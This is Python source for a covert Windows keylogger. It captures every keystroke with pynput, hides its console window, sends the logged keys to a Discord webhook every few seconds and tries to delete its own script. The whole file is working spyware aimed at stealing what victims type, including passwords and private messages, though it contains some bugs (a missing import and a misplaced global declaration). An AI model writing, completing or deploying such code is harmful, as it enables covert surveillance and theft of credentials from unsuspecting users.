import time
import threading
import ctypes
import requests
import json
import pynput
from pynput.keyboard import Key, Listener

keys = ""
start_time = time.time()
interval = 5

class Functions:
    def count_time(self):
        global start_time
        start_time = time.time()
        while True:
            time.sleep(1)
            current_time = time.time()
            if current_time - start_time >= interval:
                self.send_keyz()

    def start_logging(self):
        def on_press(key):
            global keys
            keys += str(key)

        with Listener(on_press=on_press) as listener:
            listener.join()

    def stealth_mode(self):
        ctypes.windll.kernel32.SetConsoleTitleW(" ")
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        thread = threading.Thread(target=self.start_logging)
        thread.start()

    def send_keyz(self):
        content = json.dumps({"content": keys})
        headers = {"Content-Type": "application/json"}
        requests.post("https://discord.com/api/webhooks/WEBHOOK URL", data=content, headers=headers)
        global keys
        keys = ""

    def del_me(self):
        os.system("del %0")

if __name__ == "__main__":
    f = Functions()
    t1 = threading.Thread(target=f.stealth_mode)
    t2 = threading.Thread(target=f.count_time)
    t1.start()
    t2.start()
    f.del_me()